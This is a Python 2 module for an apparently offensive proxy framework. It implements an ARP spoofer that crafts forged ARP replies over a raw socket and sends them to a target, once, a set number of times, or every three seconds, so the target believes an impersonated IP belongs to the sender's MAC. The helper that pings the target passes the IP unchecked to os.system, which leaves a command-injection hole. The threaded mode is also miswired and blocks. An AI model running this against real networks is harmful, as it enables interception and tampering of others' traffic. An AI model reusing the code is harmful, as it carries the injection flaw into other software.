# -*- coding: utf-8 -*-

from proxyframework.core import SimpleModule
import thread
import socket
import fcntl
import time
import struct
import string
from dpkt import ethernet, arp
import dnet
import os

class ArpSpoofer(SimpleModule):
    
    def __init__(self, configuration_parameters):
        
        # call superclass-constructor
        super(ArpSpoofer, self).__init__(configuration_parameters)
         
        """
        store own MAC-address - taken from: 
        http://code.activestate.com/recipes/439094-get-the-ip-address-associated-with-a-network-inter/
        """
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', self.config["interface"][:15]))

        self.sender_mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]

        # open socket for ARP-packet injection
        self.sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, 1)
        self.sock.bind((self.config["interface"], ethernet.ETH_TYPE_ARP))

        
    def start(self):
        """ Start sending ARP-Responses depending on choosen option (single or continuous)
        """

        print "[+] Sending three pings to target host..."

        if self.ping(self.config["target-ip"]):
            print "[+] Host is up."
            
            if self.config["mode"] == "continuous":
                print "[+] Sending continuous ARP-Responses"

                # start actual creation + injection of ARP-packets in separate thread
                thread.start_new_thread(self.continuous_arp_replys(self.config["target-mac"], self.config["target-ip"], self.sender_mac, self.config["host"]))

            elif self.config["mode"] == "count":
                for i in range(self.config["count"]):
                    self.single_arp_reply(self.config["target-mac"], self.config["target-ip"], self.sender_mac, self.config["host"])


    def ping(self, target_ip):
        """ Send three pings to target host. Experiments showed, that a particular timing-frame has to be present
        in order to inject faked ARP-Responses
        """
        
        resp = os.system("ping -c 3 " + target_ip)

        if resp == 0:
            return True
            
        else:
            return False
                
                
    def stop(self):
        """ Clearup targets ARP cache by sending an ARP-Response with broadcast mac address
        """

        self.single_arp_reply(self.config["target-mac"], self.config["target-ip"], "ff:ff:ff:ff:ff:ff", self.config["host"])
        

    def build_arp_reply(self, rec_mac, rec_ip, send_mac, impersonate_ip):
        """ Build an ARP-Reply-Packet
        """

        # (1) Building the ARP-Packet
        arp_p = arp.ARP()

        # sender's hardware address
        arp_p.sha = dnet.eth_aton(send_mac)

        # sender's protocol address
        arp_p.spa = socket.inet_aton(impersonate_ip)

        # target's hardware address
        arp_p.tha = dnet.eth_aton(rec_mac)

        # target's protocol address
        arp_p.tpa = socket.inet_aton(rec_ip)

        # type of operation
        arp_p.op = arp.ARP_OP_REPLY

        # (2) Building the wrapping Ethernet-Packet
        packet = ethernet.Ethernet()

        # sender's hardware address
        packet.src = dnet.eth_aton(send_mac)

        # target's hardware address
        packet.dst = dnet.eth_aton(rec_mac)

        # payload (ARP-Packet)
        packet.data = arp_p

        # type of ethernet packet
        packet.type = ethernet.ETH_TYPE_ARP

        return packet

    def single_arp_reply(self, rec_mac, rec_ip, send_mac, impersonate_ip):
        """ Sends out a single ARP-Response
        """
        self.sock.send(str(self.build_arp_reply(rec_mac, rec_ip, send_mac, impersonate_ip)))
        print "[+]  %s is at %s" % (impersonate_ip, send_mac)


    def continuous_arp_replys(self, rec_mac, rec_ip, send_mac, impersonate_ip):
        """ Sends out ARP-Response with a three second delay continously
        """
        while True:
            self.single_arp_reply(rec_mac, rec_ip, send_mac, impersonate_ip)
            time.sleep(3)